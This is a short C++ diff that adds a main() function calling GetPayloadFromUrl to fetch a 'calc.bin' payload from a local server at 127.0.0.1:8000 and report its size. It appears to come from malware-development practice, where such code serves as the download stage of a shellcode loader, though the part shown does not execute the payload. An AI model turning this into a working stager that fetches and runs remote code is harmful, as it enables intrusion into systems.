@@ -72,3 +72,17 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 	InternetCloseHandle(hInternetFile);
 	return TRUE;
 }
+
+int main() {
+	PBYTE payload = nullptr;
+	SIZE_T payloadSize = 0;
+
+	if (GetPayloadFromUrl(L"http://127.0.0.1:8000/calc.bin", &payload, &payloadSize)) {
+		std::wcout << L"[+] Payload downloaded successfully. Size : " << payloadSize << L" Bytes" << std::endl;
+		LocalFree(payload);
+	}
+	else {
+		std::wcerr << L"[!] Failed to download payload" << std::endl;
+	}
+	return 0;
+}
